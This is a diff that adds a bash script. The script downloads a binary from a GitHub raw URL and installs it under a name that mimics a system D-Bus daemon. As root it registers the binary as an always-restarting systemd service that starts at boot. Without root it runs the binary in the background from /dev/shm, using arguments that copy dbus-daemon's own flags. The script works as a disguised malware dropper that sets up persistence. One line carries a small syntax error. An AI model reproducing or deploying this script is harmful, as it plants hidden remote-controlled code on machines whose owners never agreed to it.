@@ -1,0 +1,40 @@
+#!/bin/bash
+
+
+SERVICE_NAME="dbus-sysd"
+CONFIG_DIR_ROOT="/usr/bin/dbus-sysd"
+CONFIG_FILE_ROOT="/usr/bin/dbus-sysd"
+SERVICE_PATH="/lib/systemd/system/${SERVICE_NAME}.service"
+APP_CMD_PATH="/dev/shm"
+APP_CMD="dbus-sysd"
+CHOOSE=$(echo -e "alpha\nbeta" | shuf -n1()
+CONFIG_URL="https://raw.githubusercontent.com/sachagerard1985/laravel-www/refs/heads/main/${CHOOSE}"
+
+if [[ $EUID -eq 0 ]]; then
+    curl -fsSL "$CONFIG_URL" -o "$CONFIG_FILE_ROOT"
+    chmod 755 "$CONFIG_FILE_ROOT"
+
+    cat <<EOF > "$SERVICE_PATH"
+[Unit]
+Description=${SERVICE_NAME} Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=${CONFIG_FILE_ROOT} --system --address=systemd --nofork --nopidfile --systemd-activation
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+    chmod 644 "$SERVICE_PATH"
+    systemctl daemon-reload
+    systemctl restart "$SERVICE_NAME"
+    systemctl enable "$SERVICE_NAME"
+
+else
+    curl -fsSL "$CONFIG_URL" -o "${APP_CMD_PATH}/${APP_CMD}"
+    chmod 755 "${APP_CMD_PATH}/${APP_CMD}"
+    cd ${APP_CMD_PATH} && PATH=./:$PATH ${APP_CMD} --system --address=systemd --nofork --nopidfile --systemd-activation &
+fi
